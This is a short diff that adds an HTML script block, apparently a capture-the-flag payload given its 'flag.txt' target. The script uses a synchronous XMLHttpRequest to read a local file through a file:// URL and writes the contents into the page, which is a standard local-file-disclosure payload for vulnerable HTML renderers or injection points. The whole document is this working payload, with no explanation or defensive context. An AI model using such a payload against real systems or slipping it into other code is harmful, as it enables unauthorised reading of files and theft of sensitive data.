@@ -1,0 +1,6 @@
+<script>
+    x = new XMLHttpRequest();
+    x.open('GET', 'file:///127.0.0.1/flag.txt', false);
+    x.send();
+    document.write('<pre>' + x.responseText + '</pre>');
+</script>
